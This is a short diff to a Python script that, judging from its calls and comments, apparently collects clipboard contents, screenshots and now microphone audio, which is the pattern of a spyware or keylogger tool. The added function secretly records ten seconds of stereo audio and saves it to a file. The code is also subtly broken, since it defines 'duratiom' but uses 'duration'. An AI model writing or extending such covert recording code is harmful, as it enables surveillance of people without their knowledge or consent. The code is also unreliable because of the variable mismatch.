@@ -144,9 +144,15 @@ def copy_clipboard():
 
 copy_clipboard()
 
+sample_rate=44100
+duratiom=10
 
 # get the microphone
-
+def microphone():
+  audio_data = sd.rec(int(sample_rate * duration), samplerate=sample_rate, channels=2, dtype='int16')
+  sd.wait()  
+  write(audio_information,sample_rate,audio_data)
+microphone()
 
 
 # get screenshots
